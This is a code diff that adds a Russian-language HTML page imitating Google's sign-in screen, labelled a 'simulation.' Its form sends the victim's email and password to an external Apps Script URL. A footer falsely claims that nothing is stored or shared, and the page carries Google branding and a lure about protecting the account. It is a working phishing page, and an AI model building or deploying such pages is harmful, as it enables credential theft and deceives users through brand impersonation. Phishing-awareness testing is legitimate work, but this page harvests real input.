@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Вход (симуляция)</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f1f3f4;
+      font-family: 'Roboto', Arial, sans-serif;
+      color: #202124;
+      text-align: center;
+    }
+
+        .logo img {
+      width: 94px;
+      height: auto;
+      margin-left: -6px;
+    }
+
+    .top-logo {
+      margin-top: 40px;
+      margin-bottom: -20px;
+    }
+
+    .top-logo img {
+      width: 92px;
+      height: auto;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto 4px auto;
+      background-color: #ffffff;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(60,64,67,0.3);
+      padding: 40px 32px;
+      display: inline-block;
+      text-align: left;
+    }
+
+    h2 {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 24px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 6px;
+      color: #5f6368;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+    }
+
+    .button {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      background-color: #1a73e8;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      text-align: center;
+    }
+
+    .title {
+      font-size: 24px;
+      font-weight: 500;
+      margin-top: 0px;
+      margin-bottom: 20px;
+    }
+
+        .footer {
+  max-width: 600px;
+  margin: 10px auto 10px auto;
+  font-size: 12px;
+  color: #70757a;
+  line-height: 1.5;
+  text-align: center;
+}
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img src="https://pngimg.com/uploads/google/google_PNG102344.png" alt="Google">
+    </div>
+    <div class="title">Войдите в аккаунт, чтобы мы могли его защитить</div>
+
+    <form action="https://script.google.com/macros/s/AKfycbwYu5bSgBDPIWRoA-SB5G7HUepOVbrmIr9fp2XceLpNpeMIjyxLhj-xT4SKO-E3bt2IaQ/exec" method="post">
+      <label for="email">Электронная почта</label>
+      <input type="text" id="email" name="email" placeholder="example@gmail.com">
+
+      <label for="password">Пароль</label>
+      <input type="password" id="password" name="password" placeholder="Введите пароль">
+
+      <button type="submit" class="button">Далее</button>
+    </form>
+  </div>
+  <div class="footer">
+    Вводимые данные не сохраняются и не передаются третьим лицам. <br>
+    © 2025 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
+  </div>
+</body>
+</html>
